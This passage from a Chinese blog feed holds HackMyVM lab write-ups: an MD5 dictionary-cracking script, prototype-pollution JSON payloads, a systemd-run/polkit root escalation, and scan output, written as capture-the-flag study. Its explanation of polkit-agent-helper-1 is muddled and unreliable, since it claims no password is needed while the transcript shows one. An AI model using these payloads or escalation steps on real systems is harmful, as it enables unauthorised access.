class="hljs-number">1000</span><br><br><span class="hljs-comment"># 全局控制变量</span><br>found = <span class="hljs-literal">False</span><br>lock = threading.Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_password</span>(<span class="hljs-params">word_bytes</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    计算 word_bytes + \n 的 MD5，若匹配则打印结果并退出</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> found<br>    <span class="hljs-keyword">if</span> found:<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 加上换行符后进行哈希</span><br>    candidate = word_bytes.strip() + <span class="hljs-string">b&#x27;\n&#x27;</span><br>    md5_hash = hashlib.md5(candidate).hexdigest()<br><br>    <span class="hljs-keyword">if</span> md5_hash == TARGET_HASH:<br>        <span class="hljs-keyword">with</span> lock:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>                found = <span class="hljs-literal">True</span><br>                decoded = candidate.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>).strip()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] 匹配成功！明文为: <span class="hljs-subst">&#123;decoded&#125;</span>\\n&quot;</span>)<br>                exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_thread</span>(<span class="hljs-params">word</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        check_password(word)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> found<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 开始爆破...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DICTIONARY_PATH, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            lines = file.readlines()<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 无法打开字典文件: <span class="hljs-subst">&#123;DICTIONARY_PATH&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    threads = []<br><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">while</span> threading.active_count() &gt;= MAX_THREADS:<br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 等待有线程空出</span><br>        t = threading.Thread(target=start_thread, args=(word,))<br>        t.start()<br>        threads.append(t)<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 未找到匹配项&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/2025/08/03/HackMyVM-Open/pycharm64_pM7RNBrg0X.png"></p><p>拿到密码登录root。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh root@192.168.56.130<br>root@192.168.56.130&#x27;s password: <br>Linux Open 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Jul 29 00:48:55 2025 from 192.168.3.94<br>root@Open:~# cat /root/root.txt <br>flag&#123;root-6cd1f22e65d26246530ff7a2528144e3&#125;<br>root@Open:~# <br></code></pre></td></tr></table></figure><p>就是挺中规中矩的一个靶机吧，从开始的webshell到user再到root都有种循序渐进的感觉，对命令注入考察的比较多，还有就是要注意细节。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Node</title>
    <link href="/2025/07/27/HackMyVM-Node/"/>
    <url>/2025/07/27/HackMyVM-Node/</url>
    
    <content type="html"><![CDATA[<p>好想变成一只水母啊……</p><p>极简靶机，总体只有两个知识点。</p><p>靶机ip：192.168.56.127</p><hr><h3 id="GetHungry"><a href="#GetHungry" class="headerlink" title="GetHungry"></a>GetHungry</h3><p>扫描端口，发现只开了22和一个叫3000的自定义端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nmap 192.168.56.127<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-27 00:10 EDT<br>Nmap scan report for 192.168.56.127<br>Host is up (0.00065s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:67:81:6A (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds<br><br></code></pre></td></tr></table></figure><p>访问3000端口，是个JS原型链污染挑战的小游戏，一共要过四关。</p><p><a href="https://www.zyxy.net/archives/13968">解释 JavaScript 中的 Prototype Pollution (原型污染) 漏洞及其防御。 - 智猿学院-前后端，数据库，人工智能，云计算等领域前沿技术讲座</a></p><p><a href="https://www.cnblogs.com/wh03ver/p/18461928">【漏洞学习】JavaScript Prototype Pollution（JavaScript原型污染漏洞） - wh03ver-momo - 博客园</a></p><p>关卡 1: 基础原型污染</p><p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>关卡 2: 绕过简单防护</p><p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。<br>当前进度 25%<br>攻击提示</p><p>这一关过滤了 ‘<strong>proto</strong>‘，尝试使用 ‘constructor.prototype’ 污染 Array.prototype</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>关卡 3: 多层原型污染</p><p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。<br>当前进度 50%<br>攻击提示</p><p>使用嵌套对象中的 ‘<strong>proto</strong>‘ 污染 Object.prototype，使所有对象（包括函数实例）继承 isAdmin 属性</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>关卡 4: 动态验证绕过</p><p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;validateAccess&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;function() &#123; return true; &#125;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>   <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>全部做完之后拿到hungry:imveryhungry,即user登录密码，ssh上去拿到userflag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Last login: Sat Jul 26 13:56:22 2025 from 192.168.56.104<br>hungry@Node:~$ ls -al<br>total 28<br>drwxr-xr-x 3 hungry hungry 4096 Jul 26 12:17 .<br>drwxr-xr-x 3 root   root   4096 Jul 23 02:51 ..<br>lrwxrwxrwx 1 root   root      9 Jul 23 02:52 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 hungry hungry  220 Apr 18  2019 .bash_logout<br>-rw-r--r-- 1 hungry hungry 3526 Apr 18  2019 .bashrc<br>drwx------ 3 hungry hungry 4096 Jul 26 12:17 .gnupg<br>-rw-r--r-- 1 hungry hungry  807 Apr 18  2019 .profile<br>-rw-r--r-- 1 root   root     44 Jul 23 03:04 user.txt<br>hungry@Node:~$ cat user.txt <br>flag&#123;user-8c4b1157cb6f8884aa183ac0f1447e6c&#125;<br>hungry@Node:~$ <br><br></code></pre></td></tr></table></figure><p>ps：因为之前web界面好像延迟开放了一会先用curl扫了一下，里面有非常非常多的信息，包括easy模式还有flag存储的api能直接访问，不过至少要先做一题拿到管理员cookie</p><p>pps：easy模式真的直接给登录账号密码。</p><hr><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>这里信息收集挺麻烦的就不浪费版面了，没发现东西后来问了作者才知道是要利用polkit。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs crystal">hungry<span class="hljs-variable">@Node</span>:~<span class="hljs-variable">$ </span>find / -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chsh</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chfn</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/gpasswd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/mount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/umount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/pkexec</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/sudo</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/eject/dmcrypt</span>-get-device<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign<br><span class="hljs-regexp">/usr/libexec</span><span class="hljs-regexp">/polkit-agent-helper-1</span><br></code></pre></td></tr></table></figure><p>polkit-agent-helper-1为root权限。</p><p>这我一开始没想到，毛了夜佬的wp。</p><p><a href="https://blog.csdn.net/li1136594919/article/details/131488386">Linux系统安全：权限提升与远程控制技巧-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">hungry@Node:~$ systemd-run -t /bin/bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                                                       <br>Authenticating as: hungry<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit: run-u7.service                                                                                                                            <br>Press ^] three times within 1s to disconnect TTY.<br>root@Node:/# cat /root/root.txt <br>flag&#123;root-c946739aa8e0f1008c32e311076f355f&#125;<br>root@Node:/# <br><br></code></pre></td></tr></table></figure><h4 id="为什么结合-polkit-agent-helper-1-可以直接获取-root-权限？"><a href="#为什么结合-polkit-agent-helper-1-可以直接获取-root-权限？" class="headerlink" title="为什么结合 polkit-agent-helper-1 可以直接获取 root 权限？"></a>为什么结合 <code>polkit-agent-helper-1</code> 可以直接获取 root 权限？</h4><ol><li><p><strong><code>polkit</code> 的工作原理</strong>：<br> <code>polkit</code>（PolicyKit）是 Linux 上用于授权非特权进程（如普通用户）执行特权操作（如以 root 用户运行命令）的框架。它通过策略规则来控制哪些操作可以由哪些用户执行。<code>polkit-agent-helper-1</code> 是一个与 <code>polkit</code> 一起工作的工具，它用于处理用户的认证请求和执行操作的授权。</p></li><li><p><strong>授权过程</strong>：<br> 当你运行 <code>systemd-run -t /bin/bash</code> 时，系统会触发一个 <code>polkit</code> 授权请求，要求用户进行身份验证。此时，<code>polkit</code> 会根据策略规则，决定是否允许该用户执行 root 操作。如果你输入正确的密码（或系统配置允许你的用户执行该操作），就会成功提升为 root 权限。</p></li><li><p><strong><code>polkit-agent-helper-1</code> 的角色</strong>：<br> <code>polkit-agent-helper-1</code> 作为一个工具，可以触发 <code>polkit</code> 的认证过程，允许特定用户（如普通用户 <code>hungry</code>）在未完全依赖于手动输入密码的情况下获取 root 权限。换句话说，如果 <code>polkit-agent-helper-1</code> 被配置为允许普通用户以 root 权限执行某些命令，它将通过 <code>polkit</code> 提供认证机制，并授权用户以 root 权限执行相关命令。</p></li><li><p><strong>权限策略配置</strong>：<br> 实际上，<code>polkit</code> 是通过一系列的权限策略文件来控制访问的。例如，<code>/etc/polkit-1/</code> 目录下的策略文件指定了哪些操作是允许的，哪些是需要管理员权限的，或者哪些命令是普通用户可以执行的。如果 <code>polkit</code> 的策略文件配置了普通用户 <code>hungry</code> 可以运行特定命令（如 <code>systemd-run</code>）并授权该操作，它就能够在认证后以 root 身份执行命令。</p></li><li><p><strong>如何实现这一点</strong>：</p><ul><li><code>polkit-agent-helper-1</code> 可以在后台自动处理 <code>polkit</code> 认证过程，避免需要手动输入密码。</li><li><code>systemd-run</code> 命令本身会触发 <code>polkit</code> 认证请求，但 <code>polkit-agent-helper-1</code> 可以通过 <code>polkit</code> 自动处理授权，从而允许普通用户在获得授权后执行 root 命令。</li></ul><p>总之，<code>polkit-agent-helper-1</code> 结合 <code>polkit</code> 的授权机制，能够帮助普通用户执行本应由 root 用户执行的命令。</p></li></ol><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>polkit-agent-helper-1</code> 与 <code>polkit</code> 结合使用时，能够通过自动化身份验证和权限授权的过程，让普通用户通过 <code>polkit</code> 授权来运行 root 权限的命令。在你的例子中，<code>polkit-agent-helper-1</code> 通过触发 <code>polkit</code> 的授权流程，允许 <code>hungry</code> 用户以 root 身份执行 <code>systemd-run</code> 命令。</p><p>如果你不希望某个用户能够轻松获得 root 权限，应该调整相应的 <code>polkit</code> 策略，限制其对特定命令或服务的访问权限。</p><p>好想变成一只水母啊……</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-hoshi</title>
    <link href="/2025/06/23/HackMyVM-hoshi/"/>
    <url>/2025/06/23/HackMyVM-hoshi/</url>
    
    <content type="html"><![CDATA[<p>打完至少得歇一周的靶机。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>nmap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.121<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 03:13 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating ARP Ping Scan at 03:13<br>Scanning 192.168.56.121 [1 port]<br>Completed ARP Ping Scan at 03:13, 0.04s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 03:13<br>Completed Parallel DNS resolution of 1 host. at 03:13, 0.03s elapsed<br>Initiating SYN Stealth Scan at 03:13<br>Scanning 192.168.56.121 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.121<br>Discovered open port 80/tcp on 192.168.56.121<br>Completed SYN Stealth Scan at 03:13, 0.08s elapsed (1000 total ports)<br>Initiating Service scan at 03:13<br>Scanning 2 services on 192.168.56.121<br>Completed Service scan at 03:13, 6.04s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.121<br>NSE: Script scanning 192.168.56.121.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.28s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.01s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Nmap scan report for 192.168.56.121<br>Host is up (0.00080s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: \xE5\x95\x86\xE5\x93\x81\xE5\x8F\x8D\xE9\xA6\x88 - \xE6\x98\x9F\xE9\x99\x85\xE5\x95\x86\xE5\x9F\x8E<br>MAC Address: 08:00:27:93:25:4C (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 33.089 days (since Wed May 21 01:05:12 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=261 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.80 ms 192.168.56.121<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br><br></code></pre></td></tr></table></figure><p>dirsearch：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.121<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/reports/_192.168.56.121/_25-06-23_03-14-16.txt<br><br>Target: http://192.168.56.121/<br><br>[03:14:16] Starting:                                                                                                                                       <br>[03:14:17] 403 -  279B  - /.ht_wsr.txt                                      <br>[03:14:17] 403 -  279B  - /.htaccess.bak1                                   <br>[03:14:17] 403 -  279B  - /.htaccess.orig                                   <br>[03:14:17] 403 -  279B  - /.htaccess.sample<br>[03:14:17] 403 -  279B  - /.htaccess.save                                   <br>[03:14:17] 403 -  279B  - /.htaccess_extra<br>[03:14:17] 403 -  279B  - /.htaccess_orig                                   <br>[03:14:17] 403 -  279B  - /.htaccess_sc<br>[03:14:17] 403 -  279B  - /.htaccessBAK<br>[03:14:17] 403 -  279B  - /.htaccessOLD<br>[03:14:17] 403 -  279B  - /.htaccessOLD2<br>[03:14:17] 403 -  279B  - /.htm                                             <br>[03:14:17] 403 -  279B  - /.html                                            <br>[03:14:17] 403 -  279B  - /.htpasswd_test                                   <br>[03:14:17] 403 -  279B  - /.httr-oauth<br>[03:14:17] 403 -  279B  - /.htpasswds<br>[03:14:17] 403 -  279B  - /.php                                             <br>[03:14:19] 200 -    1KB - /admin.php                                                                         <br>[03:14:28] 200 -   23KB - /info.php                                         <br>[03:14:34] 200 -  109B  - /robots.txt                                       <br>[03:14:34] 403 -  279B  - /server-status                                    <br>[03:14:34] 403 -  279B  - /server-status/                                   <br>[03:14:37] 200 -  562B  - /uploads/                                         <br>[03:14:37] 301 -  318B  - /uploads  -&gt;  http://192.168.56.121/uploads/      <br>                                                                             <br>Task Completed                                                           <br></code></pre></td></tr></table></figure><p>gobuster：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"> gobuster dir  -u http://192.168.56.121 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.121<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,zip<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 279]<br>/index.php            (Status: 200) [Size: 9185]<br>/.php                 (Status: 403) [Size: 279]<br>/info.php             (Status: 200) [Size: 85756]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.121/uploads/]<br>/admin.php            (Status: 200) [Size: 2726]<br>/robots.txt           (Status: 200) [Size: 86]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102795 / 1102800 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>前期的信息收集大差不差，访问web页面。</p><p>做的时候群里已经给出了两个提示：双图盲水印，admin.php的登录密码就在网页上无需爆破。</p><p>先访问robots，得到该网站的logo和mazesec的logo有关联。</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_5BE3u5kmq1.png"></p><p>用wget下载这里的logo和mazesec的logo，使用b神的puzzlesolver一把梭。</p><p><img 